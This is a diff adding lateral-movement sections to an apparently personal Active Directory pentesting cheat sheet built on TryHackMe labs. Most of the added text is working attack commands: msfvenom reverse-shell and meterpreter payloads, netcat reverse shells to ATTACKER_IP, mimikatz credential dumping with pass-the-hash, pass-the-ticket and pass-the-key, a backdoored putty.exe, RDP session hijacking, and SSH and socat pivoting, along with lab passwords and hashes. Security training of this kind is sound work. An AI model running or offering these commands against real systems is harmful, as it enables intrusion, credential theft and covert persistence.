@@ -315,6 +315,12 @@ schtasks /query
 # /create
 # /run
 ```
+Creating Scheduled Tasks Remotely
+```
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+schtasks /s TARGET /run /TN "THMtask1" 
+schtasks /S TARGET /TN "THMtask1" /DELETE /F
+```
 ## SharpHound and BLoodHound
 SharpHound is the official BloodHound data collector  
 SharpHound.exe: This is a Windows executable designed for standard enumeration on domain-joined Windows machines. Due to its versatility and robust functionality, it is currently the recommended method.  
@@ -335,6 +341,242 @@ https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
 **Execution privileges** – rights such as RDP or equivalent permissions
 **Outbound object control** – rights the object has over other objects
 **Inbound object control** – rights other objects have over this object
+## Lateral Movement
+First remember to craft some payload, then You can use showed below methods for running/uploading it remotely.
+### psexec
+Ports: 445/TCP (SMB)
+Required Group Memberships: Administrators
+```
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+```
+### Remote Process Creation Using WinRM
+Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+Required Group Memberships: Remote Management Users
+Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.
+```
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+```
+### Remotely Creating Services Using sc
+Ports:
+135/TCP, 49152-65535/TCP (DCE/RPC)
+445/TCP (RPC over SMB Named Pipes)
+139/TCP (RPC over SMB Named Pipes)
+Required Group Memberships: Administrators
+Windows services can also be leveraged to run arbitrary commands since they execute a command when started. 
+```
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+sc.exe \\TARGET stop THMservice
+sc.exe \\TARGET delete THMservice
+```
+#### SC payload
+Create payload
+```
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
+```
+UPload it
+```
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+```
+Run listener
+```
+msfconsole
+use exploit/multi/handler
+set LHOST ip
+exploit
+```
+Make another listener on your host
+```
+nc -lvnp 4443
+```
+Run sc/better runas on first infected machine
+```
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+```
+Run service on new infected machine
+```
+sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+```
+You have established a connection as new infected user via msfconsole
+### WMI & MSI
+Ports:
+135/TCP, 49152-65535/TCP (DCERPC)
+5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+Required Group Memberships: Administrators
+MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI
+#### Payload
+Crafting msi payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.13 LPORT=4444 -f msi > myinstaller.msi
+```
+Sending over for ex smb
+```
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+```
+Use multi handler via msfconsole   
+Via infected host use powershell and start WMI session
+```
+$username = 't1_corine.waters';
+$password = 'Korine.1994';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+Invoke the install method
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+### NTLM & Kerberos 
+#### Extracting NTLM hashes from local SAM
+```
+mimikatz
+privilege::debug
+token::elevate
+lsadump::sam
+```
+#### Extracting NTLM hashes from LSASS memory
+```
+mimikatz
+privilege::debug
+token::elevate
+sekurlsa::msv 
+```
+#### NTLM Pass the hash attack
+Gaining reverse shell
+```
+mimikatz
+token::revert
+sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
+```
+If on linux use rdp, psex, winrm
+```
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+```
+```
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+```
+```
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+```
+#### Kerberos pass the ticket attack
+Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
+```
+mimikatz
+privilege:debug
+sekurlsa::tickets /export
+kerberos::
+ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+```
+#### Kerberos Pass the key
+This kind of attack is similar to PtH but applied to Kerberos networks.
+When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
+```
+mimikatz
+privilege:debug
+sekurlsa::ekeys
+```
+If RC4 hash:
+```
+sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+If AES128 hash:
+```
+sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+if AES256 hash:
+```
+sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+### Backdooring
+If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
+```
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+### RDP hijacking
+When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.
+
+If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
+```
+PsExec64.exe -s cmd.exe
+```
+o list the existing sessions on a server, you can use the following command:
+```
+query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+ ```
+According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
+
+To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:
+```
+tscon 3 /dest:rdp-tcp#6
+```
+### Port forwarding
+Port forwarding techniques, which consist of using any compromised host as a jump box to pivot to other hosts
+#### SSH Tunnelling
+From infected machine (SSH Client) we have to make connection to our PC (SSH server).  
+First create user for that action
+```
+useradd tunneluser -m -d /home/tunneluser -s /bin/true
+passwd tunneluser
+```
+##### SSH Remote Port Forwarding
+If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker's machine). As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1.
+On PC-1 (SSH-CLient)
+```
+ssh tunneluser@attackerip -R 3389:serverip:3389 -N
+```
+Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:
+```
+xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+```
+##### SSH Local Port FOrwarding
+1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server
+Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
+Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.  
+
+To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:
+```
+ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+```
+Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:
+```
+netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+```
+##### Port Forwarding With socat
+1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server  
+In situations where SSH is not available, socat can be used to perform similar functionality.
+if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:
+```
+socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+```
+Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to.
+As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:
+```
+netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+```
+If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
+```
+socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+```
+##### Dynamic Port Forwarding and SOCKS
+1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server  
+While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.
+
+Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command on PC1:
+```
+ssh tunneluser@1.1.1.1 -R 9050 -N
+```
+In this case, the SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.
+
+The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at /etc/proxychains.conf on your AttackBox.
+If we now want to execute any command through the proxy, we can use proxychains:
+```
+proxychains curl http://pxeboot.za.tryhackme.com
+```
 ## Powershell 
 https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps  
 **PowerSploit** - powerful tool for enumeration, discovery etc  
